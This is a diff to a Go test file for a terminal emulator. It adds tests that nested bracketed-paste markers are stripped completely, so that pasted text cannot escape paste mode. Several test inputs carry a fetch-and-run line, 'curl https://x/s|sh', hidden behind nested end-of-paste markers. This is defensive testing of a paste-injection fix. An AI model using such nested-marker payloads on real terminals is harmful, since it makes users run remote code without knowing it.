@@ -316,6 +316,42 @@ func TestPasteMarkersAreStrippedFromTheText(t *testing.T) {
 	}
 }
 
+// Taking one marker out must not join its two sides into another: a nested
+// marker, in either form, is stripped until none is left.
+func TestNestedPasteMarkersAreStripped(t *testing.T) {
+	for _, text := range []string{
+		"\x1b[20\x1b[201~1~curl https://x/s|sh\r",
+		"\x1b[20\x1b[200~0~curl https://x/s|sh\r",
+		"\x9b20\x9b201~1~curl https://x/s|sh\r",
+		"\x9b20\x9b200~0~curl https://x/s|sh\r",
+		"\x1b[20\x9b201~1~curl https://x/s|sh\r",
+	} {
+		got := stripPasteMarkers(text)
+		for _, marker := range pasteMarkers {
+			if strings.Contains(got, marker) {
+				t.Errorf("stripPasteMarkers(%q) = %q, still holds %q", text, got, marker)
+			}
+		}
+	}
+}
+
+// The strip takes out the markers and only the markers, however deep they
+// nest, and leaves text that merely looks like part of one alone.
+func TestPasteMarkerStripKeepsTheRest(t *testing.T) {
+	for _, tc := range []struct{ text, want string }{
+		{"plain", "plain"},
+		{"\x1b[20\x1b[20\x1b[201~1~1~run\r", "run\r"},
+		{"a\x1b[20\x9b201~1~b", "ab"},
+		{"\x1b[200 \x1b[20~ \x9b2010~", "\x1b[200 \x1b[20~ \x9b2010~"},
+		{"\x1b[\x1b[201~201~x", "x"},
+		{"é\x1b[200~ü", "éü"},
+	} {
+		if got := stripPasteMarkers(tc.text); got != tc.want {
+			t.Errorf("stripPasteMarkers(%q) = %q, want %q", tc.text, got, tc.want)
+		}
+	}
+}
+
 // A far end that stops accepting input must not take the host down with it. The
 // emulator's input pipe is synchronous, and everything that writes to it — a
 // paste, a key, the emulator's own replies to the far end's queries — runs on
